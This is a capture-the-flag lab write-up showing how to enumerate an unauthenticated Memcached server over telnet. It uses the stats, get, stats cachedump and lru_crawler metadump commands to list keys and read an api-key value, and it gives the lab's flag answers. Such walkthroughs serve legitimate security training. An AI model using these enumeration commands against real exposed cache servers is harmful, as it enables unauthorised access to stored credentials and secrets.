# Network Recon I

## Challenge Description
A web application uses Memcached server to improve the user experience. The attacker has sneaked into the network on which the Memcached server is present.

Please answer the following questions:

1. How many key-value pairs are stored on the Memcached server?
2. Find the value stored in key “api-key” on the Memcached server.
3. Find the name of the key which is present in the warm cache of the Memcached server.

## Instructions
* Once you start the lab, you will have access to a root terminal of a Kali instance
* Your Kali has an interface with IP address 192.X.Y.2. Run "ip addr" to know the values of X and Y.
* The Target machine should be located at the IP address 192.X.Y.3. 

---

## Solution
First, as per the instructions, we have to find the IP address of the machine by running `ip addr`. In my case, the IP address of the target machine was `192.104.108.3`.

Being unfamiliar with Memcached, I did a quick internet search and found that it could be accessed using `telnet` and by default, port `11211`.
```
root@attackdefense:~# telnet 192.104.108.3 11211
Trying 192.104.108.3...
Connected to 192.104.108.3.
Escape character is '^]'.
```

We are now ready to start finding the flags.

### 1. Find number of key-value pairs

Looking at the documentation, I found the statistics commands that looked promising. After trying them out, I found that `stats` gave me the information I needed.
```
stats
✂️--- SNIP ---✂️
STAT curr_items 15
✂️--- SNIP ---✂️
END
```

#### Flag 1:
```
15
```

### 2. Find value stored in key `api-key`

To get a value stored in the key `api-key`, we can do `get api-key`:

```
get api-key
VALUE api-key 0 32
0c50e7e8b66421217aa39e2286c2d5df
END
```

#### Flag 2:
```
0c50e7e8b66421217aa39e2286c2d5df
```

### 3. Find name of key present in warm cache

This one was difficult. Firstly, I had to get acquainted with how Memcached works.

To simplify it a lot, there's 3 segments in the cache: Hot, Warm, and Cold, which contain the most to least often used items respectively. Depending on their size, Memcached stores items in different "slabs".

From doing `stats items`, we can see that slab number 1 contains the item in the warm cache:

```
stats items
STAT items:1:number 11
STAT items:1:number_hot 0
STAT items:1:number_warm 1
STAT items:1:number_cold 10
✂️--- SNIP ---✂️
STAT items:2:number 3
STAT items:2:number_hot 0
STAT items:2:number_warm 0
STAT items:2:number_cold 3
✂️--- SNIP ---✂️
STAT items:3:number 1
STAT items:3:number_hot 0
STAT items:3:number_warm 0
STAT items:3:number_cold 1
✂️--- SNIP ---✂️
END
```

Using the `stats cachedump` command, which, according to the documentation, "returns some information, broken down by slab, about items stored in memcached", we can see the items. The command `stats cachedump 1 0` dumps the items in slab `1` with no limit to the number of items (`0`). So, let's try it out:

```
stats cachedump 1 0
ITEM maxUsers [6 b; 0 s]
ITEM last-update [10 b; 0 s]
ITEM maintainer [11 b; 0 s]
ITEM contact-no [10 b; 0 s]
ITEM home-url [24 b; 0 s]
ITEM api-endpoint [21 b; 0 s]
ITEM api-secret [14 b; 0 s]
ITEM password [8 b; 0 s]
ITEM email [23 b; 0 s]
ITEM username [5 b; 0 s]
```

Huh? It only shows 10 items when it's supposed to be 11?

After even more searching, I found a [YouTube tutorial](https://www.youtube.com/watch?v=bdQpYghDna8) from the same people that did the CTF that had the exact answer I was looking for. Funny how that works ¯\\\_(ツ)_/¯

It turns out that `stats cachedump` only dumps the cold cache, not the warm one. The command I needed to use was `lru_crawler metadump`, which dumps *all* of the keys.

Outside of the YouTube video (which felt a little bit cheaty in my opinion), I only managed to find this because of a StackOverflow comment that linked to the [documentation](https://github.com/memcached/memcached/blob/bb0980fbbafd4eb723f76918e7ca364360315c1b/doc/protocol.txt#L548). Why is it so hidden? I don't know.

From our earlier exploration, we know that the one key present in the warm cache is in slab number 1, so we can use our newfound friend `lru_crawler metadump` to get *all* of the keys in slab 1:

```
lru_crawler metadump 1
key=userCount exp=-1 la=1624345421 cas=231 fetch=yes cls=1 size=75
key=username exp=-1 la=1624343259 cas=3 fetch=no cls=1 size=72
key=email exp=-1 la=1624343259 cas=4 fetch=no cls=1 size=87
key=password exp=-1 la=1624343259 cas=5 fetch=no cls=1 size=75
key=api-secret exp=-1 la=1624343259 cas=8 fetch=no cls=1 size=83
key=api-endpoint exp=-1 la=1624343259 cas=9 fetch=no cls=1 size=92
key=home-url exp=-1 la=1624343259 cas=10 fetch=no cls=1 size=91
key=contact-no exp=-1 la=1624343259 cas=11 fetch=no cls=1 size=79
key=maintainer exp=-1 la=1624343259 cas=12 fetch=no cls=1 size=80
key=last-update exp=-1 la=1624343259 cas=13 fetch=yes cls=1 size=80
key=maxUsers exp=-1 la=1624343259 cas=15 fetch=yes cls=1 size=77
END
```

I'm not sure why the key naming is so inconsistent (both camelCase and kebab-case?) but hey. We found the answer!

#### Flag 3:
```
userCount
```